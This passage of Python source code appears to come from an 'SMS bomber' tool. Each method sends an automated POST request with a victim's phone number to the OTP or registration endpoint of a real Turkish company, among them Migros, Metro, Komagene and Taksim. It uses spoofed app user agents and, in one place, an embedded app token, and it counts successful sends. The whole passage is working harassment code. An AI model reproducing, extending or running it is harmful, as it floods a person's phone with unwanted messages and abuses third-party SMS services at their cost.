name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"
            r = requests.post(url, headers=headers, data=data)
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> koton.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> koton.com")


    #pisir.com
    def Pisir(self):
        try:
            url = "https://api.pisir.com:443/v1/login/"
            headers = {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Pisir/386 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            json={"app_build": "386", "app_platform": "ios", "msisdn": f"+90{self.phone}"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["ok"] == "1":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.pisir.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.pisir.com")


    #hizliecza.com.tr
    def Hizliecza(self):
        try:
            url = "https://hizlieczaprodapi.hizliecza.net:443/mobil/account/sendOTP"
            headers = {"Accept": "application/json", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "hizliecza/12 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Authorization": "Bearer null"}
            json={"otpOperationType": 2, "phoneNumber": f"+90{self.phone}"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> hizlieczaprodapi.hizliecza.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> hizlieczaprodapi.hizliecza.net")


    #metro-tr.com
    def Metro(self):
        try:
            url = "https://feature.metro-tr.com:443/api/mobileAuth/validateSmsSend"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Applicationversion": "2.1.1", "Applicationplatform": "2", "User-Agent": "Metro Turkiye/2.1.1 (com.mcctr.mobileapplication; build:1; iOS 15.7.7) Alamofire/2.1.1", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Connection": "close"}
            json={"methodType": "2", "mobilePhoneNumber": f"+90{self.phone}"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["status"] == "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> feature.metro-tr.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> feature.metro-tr.com")

    
    #qumpara.com
    def Qumpara(self):
        try:
            url = "https://tr-api.fisicek.com:443/v1.3/auth/getOTP"
            headers = {"Accept": "application/json", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "qumpara/4.2.53 (iPhone; iOS 15.7.7; Scale/3.00)", "Accept-Language": "en-TR;q=1, tr-TR;q=0.9"}
            json={"msisdn": f"+90{self.phone}"}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> tr-api.fisicek.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> tr-api.fisicek.com")


    #paybol.com.tr
    def Paybol(self):
        try:
            url = "https://pyb-mobileapi.walletgate.io:443/v1/Account/RegisterPersonalAccountSendOtpSms"
            headers = {"Accept": "application/json", "Content-Type": "application/json", "User-Agent": "Paybol/1.2.1 (com.app.paybol; build:1; iOS 15.7.7) Alamofire/5.5.0", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
            json={"phone_number": f"90{self.phone}"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["status"] == 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> pyb-mobileapi.walletgate.io")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pyb-mobileapi.walletgate.io")

        
    #migros.com.tr
    def Migros(self):
        try:
            url = "https://rest.migros.com.tr:443/hemen/users/login/otp"
            headers = {"Content-Type": "application/json", "X-Device-Platform": "IOS", "X-Request-Identifier": "6059F027-F6BC-41A9-93E6-77FB388DA19B", "Accept": "*/*", "X-Device-Model": "iPhone 7 Plus", "X-Store-Ids": "", "X-Device-Version": "10.5.2", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-Device-Platform-Version": "15.7.7", "User-Agent": "Migros/1690 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Identifier": "DA391FD6-7299-4A4E-A35E-1D3090547582", "X-Device-Latitude": "", "X-Device-Longitude": "", "X-Device-Type": "MOBILE"}
            json={"phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["successful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.migros.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.migros.com.tr")


    #file.com.tr
    def File(self):
        try:
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            json={"mobilePhoneNumber": f"90{self.phone}"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["responseType"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.filemarket.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.filemarket.com.tr")


    #roombadi.com
    def Roombadi(self):
        try:
            url = "https://api.roombadi.com:443/api/v2/auth/otp/authenticate"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "Roombadi/3 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en,tr"}
            json={"countryId": 2, "phone": self.phone}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["remainingTime"] == 120:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.roombadi.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.roombadi.com")
    

    #komagene.com.tr
    def Komagene(self):
        try:
            url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
            json={"Telefon": self.phone,"FirmaId": "32"}
            headers = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"}
            r = requests.post(url=url, headers=headers, json=json)
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gateway.komagene.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gateway.komagene.com.tr")
    
    
    #kuryemgelsin.com
    def KuryemGelsin(self):
        try:
            url = "https://api.kuryemgelsin.com:443/en/api/users/registerMessage/"
            json={"phoneNumber": self.phone, "phone_country_code": "+90"}
            r = requests.post(url=url, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.kuryemgelsin.com 3 hak")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.kuryemgelsin.com 3 hak")
    
    
    #porty.tech
    def Porty(self):
        try:
            url = "https://panel.porty.tech:443/api.php?"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=UTF-8", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
            json={"job": "start_login", "phone": self.phone}
            r = requests.post(url=url, json=json, headers=headers)
            if r.json()["status"]== "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> panel.porty.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> panel.porty.tech")
            
    
    #taksim.digital
    def Taksim(self):
        try:
            url = "https://service.taksim.digital/services/PassengerRegister/Register"
            json= {"countryPhoneCode": "+90","phoneNo": self.phone}
            r = requests.post(url=url, json=json)
            if r.json()["success"]== True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> service.taksim.digital")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> service.taksim.digital")
    
    
    #tasimacim.com
    def Tasimacim(self):
        try:
            url = "https://server.tasimacim.com/requestcode"
            json= {"phone": self.phone, "lang": "tr"}
            r = requests.post(url=url, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> server.tasimacim.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> server.tasimacim.com")
    
    
    #yuffi.co
    def Yuffi(self):
        try:
            url = "https://api.yuffi.co/api/parent/login/user"
            json = {"phone": self.phone, "kvkk": True}
            r = requests.post(url, json=json)
            if r.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.yuffi.co")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yuffi.co")

"""